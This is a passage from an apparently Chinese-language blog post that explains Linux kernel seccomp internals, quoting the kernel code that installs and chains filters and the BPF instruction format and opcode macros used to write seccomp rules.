*/</span></span><br><span class="line">	smp_mb__before_atomic();</span><br><span class="line">	<span class="comment">/* Assume default seccomp processes want spec flaw mitigation. */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SECCOMP_FILTER_FLAG_SPEC_ALLOW) == <span class="number">0</span>)</span><br><span class="line">		arch_seccomp_spec_mitigate(task);</span><br><span class="line">	set_task_syscall_work(task, SECCOMP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Valid flags for SECCOMP_SET_MODE_FILTER */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_TSYNC		(1UL &lt;&lt; 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_LOG			(1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_SPEC_ALLOW		(1UL &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_NEW_LISTENER	(1UL &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_TSYNC_ESRCH		(1UL &lt;&lt; 4)</span></span><br><span class="line"><span class="comment">/* Received notifications wait in killable state (only respond to fatal signals) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECCOMP_FILTER_FLAG_WAIT_KILLABLE_RECV	(1UL &lt;&lt; 5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_task_syscall_work(t, fl) \</span></span><br><span class="line"><span class="meta">	set_bit(SYSCALL_WORK_BIT_##fl, &amp;task_thread_info(t)-&gt;syscall_work)</span></span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">syscall_work_bit</span> &#123;</span></span><br><span class="line">	SYSCALL_WORK_BIT_SECCOMP,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_TRACEPOINT,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_TRACE,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_EMU,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_AUDIT,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_USER_DISPATCH,</span><br><span class="line">	SYSCALL_WORK_BIT_SYSCALL_EXIT_TRAP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在这个函数之中，设置了当前进程的<code>mode</code>，随后出现了一个判断，判断成功时执行<code>arch_seccomp_spec_mitigate</code>函数。这个函数的内部逻辑比较复杂，先略过。最后调用<code>set_task_syscall_work</code>，这是一个宏定义，定义如上所示，就是设置一个位，表示这个线程已经开启了seccomp检查。</p>
<h2 id="b-自定义规则"><a class="markdownIt-Anchor" href="#b-自定义规则"></a> B. 自定义规则</h2>
<p>对于自定义规则而言，添加的过程要复杂许多。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">seccomp_set_mode_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">				    <span class="type">const</span> <span class="type">char</span> __user *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> seccomp_mode = SECCOMP_MODE_FILTER;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">prepared</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">long</span> ret = -EINVAL;</span><br><span class="line">	<span class="type">int</span> listener = <span class="number">-1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">listener_f</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate flags. */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~SECCOMP_FILTER_FLAG_MASK)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * In the successful case, NEW_LISTENER returns the new listener fd.</span></span><br><span class="line"><span class="comment">	 * But in the failure case, TSYNC returns the thread that died. If you</span></span><br><span class="line"><span class="comment">	 * combine these two flags, there&#x27;s no way to tell whether something</span></span><br><span class="line"><span class="comment">	 * succeeded or failed. So, let&#x27;s disallow this combination if the user</span></span><br><span class="line"><span class="comment">	 * has not explicitly requested no errors from TSYNC.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SECCOMP_FILTER_FLAG_TSYNC) &amp;&amp;</span><br><span class="line">	    (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &amp;&amp;</span><br><span class="line">	    ((flags &amp; SECCOMP_FILTER_FLAG_TSYNC_ESRCH) == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The SECCOMP_FILTER_FLAG_WAIT_KILLABLE_SENT flag doesn&#x27;t make sense</span></span><br><span class="line"><span class="comment">	 * without the SECCOMP_FILTER_FLAG_NEW_LISTENER flag.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((flags &amp; SECCOMP_FILTER_FLAG_WAIT_KILLABLE_RECV) &amp;&amp;</span><br><span class="line">	    ((flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) == <span class="number">0</span>))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Prepare the new filter before holding any locks. */</span></span><br><span class="line">	prepared = seccomp_prepare_user_filter(filter);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(prepared))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(prepared);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &#123;</span><br><span class="line">		listener = get_unused_fd_flags(O_CLOEXEC);</span><br><span class="line">		<span class="keyword">if</span> (listener &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			ret = listener;</span><br><span class="line">			<span class="keyword">goto</span> out_free;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		listener_f = init_listener(prepared);</span><br><span class="line">		<span class="keyword">if</span> (IS_ERR(listener_f)) &#123;</span><br><span class="line">			put_unused_fd(listener);</span><br><span class="line">			ret = PTR_ERR(listener_f);</span><br><span class="line">			<span class="keyword">goto</span> out_free;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Make sure we cannot change seccomp or nnp state via TSYNC</span></span><br><span class="line"><span class="comment">	 * while another thread is in the middle of calling exec.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC &amp;&amp;</span><br><span class="line">	    mutex_lock_killable(&amp;current-&gt;signal-&gt;cred_guard_mutex))</span><br><span class="line">		<span class="keyword">goto</span> out_put_fd;</span><br><span class="line"></span><br><span class="line">	spin_lock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!seccomp_may_assign_mode(seccomp_mode))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (has_duplicate_listener(prepared)) &#123;</span><br><span class="line">		ret = -EBUSY;</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ret = seccomp_attach_filter(flags, prepared);</span><br><span class="line">	<span class="keyword">if</span> (ret)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	<span class="comment">/* Do not free the successfully attached filter. */</span></span><br><span class="line">	prepared = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	seccomp_assign_mode(current, seccomp_mode, flags);</span><br><span class="line">out:</span><br><span class="line">	spin_unlock_irq(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC)</span><br><span class="line">		mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">out_put_fd:</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_NEW_LISTENER) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret) &#123;</span><br><span class="line">			listener_f-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">			fput(listener_f);</span><br><span class="line">			put_unused_fd(listener);</span><br><span class="line">			seccomp_notify_detach(prepared);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			fd_install(listener, listener_f);</span><br><span class="line">			ret = listener;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">out_free:</span><br><span class="line">	seccomp_filter_free(prepared);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数中有很多的判断条件，当这些判断条件不满足时，会直接返回一个错误值。需要注意的是<code>flags &amp; ~SECCOMP_FILTER_FLAG_MASK = 0</code>，也就是<code>flags</code>除了最低6位其他位必须全为0。</p>
<p>通过3个判断之后，调用了<code>seccomp_prepare_user_filter</code>函数初始化<code>struct seccomp_filter</code>结构体实例。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> &#123;</span></span><br><span class="line">	<span class="type">refcount_t</span> refs;</span><br><span class="line">	<span class="type">refcount_t</span> users;</span><br><span class="line">	<span class="type">bool</span> <span class="built_in">log</span>;</span><br><span class="line">	<span class="type">bool</span> wait_killable_recv;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">action_cache</span> <span class="title">cache</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">prev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_prog</span> *<span class="title">prog</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">notification</span> *<span class="title">notif</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">notify_lock</span>;</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> wqh;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> seccomp_filter *</span><br><span class="line"><span class="title function_">seccomp_prepare_user_filter</span><span class="params">(<span class="type">const</span> <span class="type">char</span> __user *user_filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">fprog</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">filter</span> =</span> ERR_PTR(-EFAULT);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line">	<span class="keyword">if</span> (in_compat_syscall()) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">compat_sock_fprog</span> <span class="title">fprog32</span>;</span></span><br><span class="line">		<span class="keyword">if</span> (copy_from_user(&amp;fprog32, user_filter, <span class="keyword">sizeof</span>(fprog32)))</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		fprog.len = fprog32.len;</span><br><span class="line">		fprog.filter = compat_ptr(fprog32.filter);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="comment">/* falls through to the if below. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;fprog, user_filter, <span class="keyword">sizeof</span>(fprog)))</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	filter = seccomp_prepare_filter(&amp;fprog);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> filter;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> &#123;</span>	<span class="comment">/* Required for SO_ATTACH_FILTER. */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">short</span>		len;	<span class="comment">/* Number of filter blocks */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> __<span class="title">user</span> *<span class="title">filter</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>	<span class="comment">/* Filter block */</span></span><br><span class="line">	__u16	code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">	__u8	jt;	<span class="comment">/* Jump true */</span></span><br><span class="line">	__u8	jf;	<span class="comment">/* Jump false */</span></span><br><span class="line">	__u32	k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>从上面的结构体定义和函数定义可以看出，我们传入的用户态指针需要是<code>sock_fprog</code>结构体实例，Linux中定义了一个seccomp规则的最大长度为4096，即len必须位于(0,4096]，上面的<code>sock_filter</code>可以理解为seccomp沙箱的一条“指令”。在<code>seccomp_prepare_user_filter</code>中也有一些检查，通过返回值我们就可以知道是针对什么的检查，后面两个是<code>EACCES</code>和<code>ENOMEM</code>，一个是权限相关，一个是内存不够，一般都不会发生。随后就是将用户传递的过滤器中的内容保存到<code>seccomp_filter</code>实例中返回。</p>
<p>初始化<code>seccomp_filter</code>完成后，我们先略过后面对一些flags的特殊处理，判断了一下是否能够加载规则，随后调用了<code>seccomp_attach_filter</code>，主要是处理已有的flags，随后将新的filter规则添加到头部的位置，使用<code>prev</code>属性连接成一个单链表，如下所示。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">seccomp_attach_filter</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">				  <span class="keyword">struct</span> seccomp_filter *filter)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> total_insns;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">seccomp_filter</span> *<span class="title">walker</span>;</span></span><br><span class="line"></span><br><span class="line">	assert_spin_locked(&amp;current-&gt;sighand-&gt;siglock);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Validate resulting filter length. */</span></span><br><span class="line">	total_insns = filter-&gt;prog-&gt;len;</span><br><span class="line">	<span class="keyword">for</span> (walker = current-&gt;seccomp.filter; walker; walker = walker-&gt;prev)</span><br><span class="line">		total_insns += walker-&gt;prog-&gt;len + <span class="number">4</span>;  <span class="comment">/* 4 instr penalty */</span></span><br><span class="line">	<span class="keyword">if</span> (total_insns &gt; MAX_INSNS_PER_PATH)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If there is an existing filter, make it the prev and don&#x27;t drop its</span></span><br><span class="line"><span class="comment">	 * task reference.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	filter-&gt;prev = current-&gt;seccomp.filter;</span><br><span class="line">	seccomp_cache_prepare(filter);</span><br><span class="line">	current-&gt;seccomp.filter = filter;</span><br><span class="line">	<span class="type">atomic_inc</span>(&amp;current-&gt;seccomp.filter_count);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Now that the new filter is in place, synchronize to all threads. */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SECCOMP_FILTER_FLAG_TSYNC)</span><br><span class="line">		seccomp_sync_threads(flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以上就是过滤器添加的大致流程。</p>
<h1 id="0x02-seccomp沙箱指令格式"><a class="markdownIt-Anchor" href="#0x02-seccomp沙箱指令格式"></a> 0x02. seccomp沙箱“指令”格式</h1>
<p>seccomp沙箱的每一条指令的长度都是8字节，分为4个字段——code、jt、jf、k。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> &#123;</span>	<span class="comment">/* Filter block */</span></span><br><span class="line">	__u16	code;   <span class="comment">/* Actual filter code */</span></span><br><span class="line">	__u8	jt;	<span class="comment">/* Jump true */</span></span><br><span class="line">	__u8	jf;	<span class="comment">/* Jump false */</span></span><br><span class="line">	__u32	k;      <span class="comment">/* Generic multiuse field */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在Linux中定义了一些方便编写seccomp code的宏定义（code含义定义在 <code>/include/uapi/linux/bpf_common.h</code> 中），这里引用<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273495.htm#msg_header_h1_2">资料</a>中的注释便于理解：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_STMT</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_STMT(code, k) &#123; (unsigned short)(code), 0, 0, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BPF_JUMP</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_JUMP(code, k, jt, jf) &#123; (unsigned short)(code), jt, jf, k &#125;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Instruction classes */</span>                    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_CLASS(code) ((code) &amp; 0x07)    <span class="comment">//指定操作的类别</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LD        0x00               <span class="comment">//将值复制到累加器中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LDX        0x01               <span class="comment">//将值加载到索引寄存器中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ST        0x02               <span class="comment">//将累加器中的值存到暂存器</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_STX        0x03               <span class="comment">//将索引寄存器的值存储在暂存器中</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ALU        0x04               <span class="comment">//用索引寄存器或常数作为操作数在累加器上执行算数或逻辑运算</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JMP        0x05               <span class="comment">//跳转</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RET        0x06               <span class="comment">//返回</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MISC        0x07           <span class="comment">// 其他类别</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* ld/ldx fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SIZE(code)  ((code) &amp; 0x18)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_W        0x00 <span class="comment">/* 32-bit */</span>       <span class="comment">//字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_H        0x08 <span class="comment">/* 16-bit */</span>       <span class="comment">//半字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_B        0x10 <span class="comment">/*  8-bit */</span>       <span class="comment">//字节</span></span></span><br><span class="line"><span class="comment">/* eBPF        BPF_DW        0x18    64-bit */</span>       <span class="comment">//双字</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_MODE(code)  ((code) &amp; 0xe0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IMM        0x00                  <span class="comment">//常数 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ABS        0x20                  <span class="comment">//固定偏移量的数据包数据(绝对偏移)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_IND        0x40                  <span class="comment">//可变偏移量的数据包数据(相对偏移)</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MEM        0x60                  <span class="comment">//暂存器中的一个字</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LEN        0x80                  <span class="comment">//数据包长度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MSH        0xa0</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* alu/jmp fields */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_OP(code)    ((code) &amp; 0xf0)       <span class="comment">//当操作码类型为ALU时，指定具体运算符   </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_ADD        0x00        </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_SUB        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MUL        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_DIV        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_OR        0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_AND        0x50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_LSH        0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_RSH        0x70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_NEG        0x80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_MOD        0x90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_XOR        0xa0</span></span><br><span class="line">                                               <span class="comment">//当操作码是jmp时指定跳转类型</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JA        0x00</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JEQ        0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGT        0x20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JGE        0x30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_JSET        0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPF_SRC(code)   ((code) &amp; 0x08)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_K        0x00                    <span class="comment">//常数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>        BPF_X        0x08                    <span class="comment">//索引寄存器</span></span></span><br></pre></td></tr></table></figure>
<p>在笔者查资料的时候，发现这个BPF不仅能用来编写seccomp规则，它更像是一个较为成熟的汇编语言+胶水语言，并在2014年就拥有了自己的执行引擎eBPF。这又是一个完全的知识体系。</p>
<p>网络上针对BPF大多是通过C等进行编译获得BPF代码，但对于seccomp而言，我们要做的是直接编写BPF code。但专用于seccomp的BPF除了通用的BPF语法之外，还有一些额外的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * All BPF programs must return a 32-bit value.</span></span><br><span class="line"><span class="comment"> * The bottom 16-bits are for optional return data.</span></span><br><span class="line"><span class="comment"> * The upper 16-bits are ordered from least permissive values to most,</span></span><br><span class="line"><span class="comment"> * as a signed value (so 0x8000000 is negative).</span></span><br><span class="line"><span class="comment"> 